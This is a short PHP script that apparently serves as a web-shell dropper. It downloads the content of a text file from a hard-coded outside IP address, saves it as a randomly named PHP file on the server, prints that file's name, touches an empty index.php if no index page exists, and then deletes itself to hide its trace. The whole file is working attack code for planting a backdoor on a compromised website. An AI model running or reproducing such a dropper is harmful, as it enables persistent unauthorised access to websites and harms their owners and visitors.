<?php
$min=0;
$max=9999999999;
$rx=mt_rand($min,$max);
function http_get($url)
{ 
	$c = curl_init($url);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($c, CURLOPT_HEADER, 0);
	return 
	curl_exec($c);
	curl_close($c);
}

$Shelltxt = http_get("http://67.212.182.182/~quadslab/wp-includes/pomo/dbconfig.txt");
$fo=fopen("$rx.php","w");
fwrite($fo,$Shelltxt);
echo"$rx.php";
if(!file_exists("index.php") && !file_exists("index.htm") && !file_exists("index.html")){
	touch("index.php");
}
unlink(__FILE__);
?>